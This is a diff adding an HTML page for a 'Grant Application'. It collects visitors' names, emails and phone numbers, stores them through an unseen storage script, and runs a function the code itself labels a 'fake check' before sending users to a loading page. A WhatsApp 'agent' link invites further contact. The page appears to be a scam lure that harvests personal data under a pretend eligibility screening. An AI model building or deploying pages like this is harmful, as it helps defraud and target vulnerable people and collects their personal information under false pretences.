@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Application</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <div class="container">
+    <div class="card">
+      <h2>Grant Application</h2>
+      <div class="card">
+  <h2>Step 1: Application Submission</h2>
+  <p>Complete the form below to begin eligibility review.</p>
+</div>
+<div class="card">
+  <h2>Application Instructions</h2>
+
+  <p>To be considered for this program, ensure your details meet the following requirements:</p>
+
+  <ul>
+    <li>Full Name must contain only letters (no numbers or symbols)</li>
+    <li>Email must be valid and active (Gmail preferred)</li>
+    <li>Phone number must be reachable and correctly formatted</li>
+    <li>All fields must be filled correctly before submission</li>
+  </ul>
+
+  <p><strong>Note:</strong> Incomplete or invalid applications will not pass eligibility screening.</p>
+</div>
+      <form id="grantForm">
+
+        <input type="text" id="name" placeholder="Full Name" required>
+        <input type="email" id="email" placeholder="Email Address" required>
+        <input type="tel" id="phone" placeholder="Phone Number" required>
+
+        <button type="submit">Check Eligibility</button>
+<p style="font-size:12px; opacity:0.7;">
+Your application will enter a secure review system after submission.
+</p>
+      </form>
+
+    </div>
+  </div>
+
+  <script src="storage.js"></script>
+
+
+<script>
+document.getElementById("grantForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const data = {
+    name: document.getElementById("name").value,
+    email: document.getElementById("email").value,
+    phone: document.getElementById("phone").value
+  };
+
+  StorageAPI.saveApplication(data);
+
+  const eligible = fakeCheck(data);
+
+  if (eligible) {
+    localStorage.setItem("eligible", "true");
+    window.location.href = "loading.html";
+  } else {
+    localStorage.setItem("eligible", "false");
+    window.location.href = "not-eligible.html";
+  }
+});
+
+
+// ✅ SINGLE CLEAN FAKE CHECK FUNCTION
+function fakeCheck(user) {
+
+  const nameValid = /^[A-Za-z ]{3,}$/.test(user.name);
+
+  const emailValid = /^[^\s@]+@gmail\.com$/.test(user.email);
+
+  const phoneValid = /^[0-9+]{10,15}$/.test(user.phone);
+
+  return nameValid && emailValid && phoneValid;
+}
+</script>
+<div class="card center">
+  <p>Need an agent?</p>
+
+  <a href="https://wa.me/2349113558909" target="_blank">
+    <button>Chat on WhatsApp</button>
+  </a>
+</div>
+</body>
+</html>
